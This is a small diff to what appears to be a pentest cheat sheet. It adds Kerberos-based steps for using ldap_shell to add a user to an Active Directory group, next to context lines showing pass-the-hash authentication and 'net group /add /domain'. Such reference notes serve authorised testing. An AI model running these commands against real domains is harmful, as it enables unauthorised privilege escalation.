@@ -26,6 +26,18 @@ Ldap_shell -> `ldap_shell '<domain>/<user>:' -hashes fffffffffffffffffffffffffff
 
 <br>
 
+With KERBEROS auth:
+
+Ldap_shell -> `gettgt.py <domain>/<user>:<password>`
+
+`export KRB5CCNAME=<ticket_name>`
+
+`ldap_shell '<domain>/<user>:<password>' -dc-host <machine.domain> -k`
+
+`add_user_to_group <user> <group>`
+
+<br>
+
 ### From Windows (internally):
 
 `net group <group> <user> /add /domain`
